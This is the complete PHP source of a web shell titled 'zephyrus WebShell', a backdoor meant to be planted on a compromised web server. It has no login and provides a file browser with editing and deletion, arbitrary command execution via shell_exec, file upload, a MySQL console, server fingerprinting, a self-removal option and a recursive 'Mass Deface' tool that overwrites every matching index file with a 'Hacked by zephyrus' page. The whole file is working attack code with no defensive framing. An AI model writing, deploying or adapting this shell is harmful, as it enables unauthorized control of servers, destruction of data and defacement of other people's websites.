<?php
session_start();

// ---------- Functions ----------
function list_files($dir) {
    $files = scandir($dir);
    echo '<table class="file-table">';
    echo '<tr><th>Name</th><th>Type</th><th>Action</th></tr>';
    foreach ($files as $f) {
        if ($f === '.') continue;
        $path = realpath("$dir/$f");
        $isDir = is_dir($path);
        echo '<tr>';
        echo '<td>' . ($isDir ? "<a href='?dir=$path'><b>$f</b></a>" : "<a href='?file=$path'>$f</a>") . '</td>';
        echo '<td>' . ($isDir ? 'Directory' : 'File') . '</td>';
        echo '<td>' . (!$isDir ? "<a href='?del=$path' class='del-btn'>Delete</a>" : '') . '</td>';
        echo '</tr>';
    }
    echo '</table>';
}

function server_info() {
    echo '<pre>';
    echo "PHP Version: ".phpversion()."\n";
    echo "OS: ".PHP_OS."\n";
    echo "Server IP: ".$_SERVER['SERVER_ADDR']."\n";
    echo "User Agent: ".$_SERVER['HTTP_USER_AGENT']."\n";
    echo "Disabled functions: ".ini_get('disable_functions')."\n";
    echo '</pre>';
}

// ---------- UI ----------
echo '<html><head><title>zephyrus Shell</title>
<style>
body { background: #111; color: #0f0; font-family: monospace; padding: 20px; }
a { color: #0ff; text-decoration: none; }
a:hover { text-decoration: underline; }
input, textarea, select, button {
    background: #000; color: #0f0; border: 1px solid #0f0; padding: 5px;
}
.file-table { width: 100%; border-collapse: collapse; margin-top: 20px; }
.file-table th, .file-table td {
    border: 1px solid #0f0; padding: 8px 12px; text-align: left;
}
.file-table th { background: #222; }
.file-table tr:hover { background-color: #222; }
.del-btn { color: red; font-weight: bold; }
button { margin-top: 10px; cursor: pointer; }
</style>
<script src="https://cdnjs.cloudflare.com/ajax/libs/ace/1.4.12/ace.js"></script>
</head><body>';

echo '<h2>zephyrus WebShell</h2>
<a href="?">[Home]</a> | 
<a href="?info=1">[Server Info]</a> | 
<a href="?shell=1">[Shell]</a> | 
<a href="?upload=1">[Upload]</a> | 
<a href="?sql=1">[MySQL]</a> | 
<a href="?massdeface=1" style="color:orange;">[Mass Deface]</a> | 
<a href="?remove=1" style="color:red;">[Remove Shell]</a>';

$dir = $_GET['dir'] ?? getcwd();

if (isset($_GET['remove'])) {
    echo '<h3>Confirm Removal</h3><form method="POST"><input type="submit" name="confirm_remove" value="Yes, remove this shell"></form>';
    if (isset($_POST['confirm_remove'])) {
        unlink(__FILE__);
        exit("<h3>Shell removed successfully.</h3>");
    }
} elseif (isset($_GET['file'])) {
    $file = $_GET['file'];
    if (isset($_POST['edit'])) file_put_contents($file, $_POST['edit']);
    echo "<h3>Editing: $file</h3>
    <form method='POST'><div id='editor' style='height:400px;width:100%;'>".htmlspecialchars(file_get_contents($file))."</div>
    <textarea id='edit' name='edit' style='display:none;'></textarea>
    <button onclick=\"document.getElementById('edit').value=editor.getValue();\">Save</button></form>
    <script>
    var editor = ace.edit('editor');
    editor.setTheme('ace/theme/monokai');
    editor.session.setMode('ace/mode/php');
    editor.setOption('wrap', true);
    </script>";
} elseif (isset($_GET['del'])) {
    unlink($_GET['del']);
    header("Location: ?dir=$dir");
} elseif (isset($_GET['shell'])) {
    if (isset($_POST['cmd'])) $out = shell_exec($_POST['cmd']);
    echo '<form method="POST"><input name="cmd" placeholder="Command" style="width:80%;"><button>Run</button></form>';
    if (isset($out)) echo "<pre>$out</pre>";
} elseif (isset($_GET['upload'])) {
    echo '<form method="POST" enctype="multipart/form-data">
    <input type="file" name="upfile">
    <button>Upload</button></form>';
    if (isset($_FILES['upfile'])) move_uploaded_file($_FILES['upfile']['tmp_name'], $dir.'/'.$_FILES['upfile']['name']);
} elseif (isset($_GET['info'])) {
    server_info();
} elseif (isset($_GET['sql'])) {
    echo '<form method="POST">
    Host: <input name="host" value="localhost"><br>
    User: <input name="user"><br>
    Pass: <input name="pass" type="password"><br>
    DB: <input name="db"><br>
    SQL: <textarea name="sql" rows="5" cols="80"></textarea><br>
    <button>Execute</button></form>';
    if (isset($_POST['sql'])) {
        $mysqli = new mysqli($_POST['host'], $_POST['user'], $_POST['pass'], $_POST['db']);
        if ($mysqli->connect_error) die("Connect error: ".$mysqli->connect_error);
        $res = $mysqli->query($_POST['sql']);
        if ($res === TRUE) echo "Query OK";
        elseif ($res) {
            echo "<table class='file-table'><tr>";
            while ($f = $res->fetch_field()) echo "<th>{$f->name}</th>";
            echo "</tr>";
            while ($r = $res->fetch_row()) {
                echo "<tr>";
                foreach ($r as $c) echo "<td>".htmlspecialchars($c)."</td>";
                echo "</tr>";
            }
            echo "</table>";
        } else echo "Error: ".$mysqli->error;
    }
} elseif (isset($_GET['massdeface'])) {
    echo "<h3>🔥 Mass Deface Tool</h3>";
    if (!isset($_POST['go'])) {
        echo '
        <form method="POST">
            <label>Base Directory:</label><br>
            <input type="text" name="basedir" value="'.htmlspecialchars($dir).'" style="width:60%;"><br><br>
            <label>Filename to overwrite (e.g. index.php):</label><br>
            <input type="text" name="filename" value="index.php"><br><br>
            <label>Deface Message / HTML:</label><br>
            <textarea name="deface" rows="10" cols="80">&lt;h1&gt;Hacked by zephyrus&lt;/h1&gt;</textarea><br><br>
            <button name="go">Start Mass Deface</button>
        </form>';
    } else {
        $basedir = $_POST['basedir'];
        $filename = $_POST['filename'];
        $content = $_POST['deface'];
        $count = 0;
        $defaced = [];

        function mass_deface($dir, $filename, $content, &$count, &$defaced) {
            foreach (scandir($dir) as $f) {
                if ($f === '.' || $f === '..') continue;
                $path = "$dir/$f";
                if (is_dir($path)) {
                    mass_deface($path, $filename, $content, $count, $defaced);
                } else {
                    if (basename($path) === $filename) {
                        if (file_put_contents($path, $content) !== false) {
                            $count++;
                            $defaced[] = $path;
                        }
                    }
                }
            }
        }

        mass_deface($basedir, $filename, $content, $count, $defaced);

        echo "<p style='color:lime;'>✅ Defaced $count file(s) named <b>$filename</b> under <b>$basedir</b></p>";
        echo "<pre>";
        foreach ($defaced as $f) echo "✔ $f\n";
        echo "</pre>";
    }
} else {
    echo "<h3>Browsing: $dir</h3>";
    list_files($dir);
}

echo '</body></html>';
?>
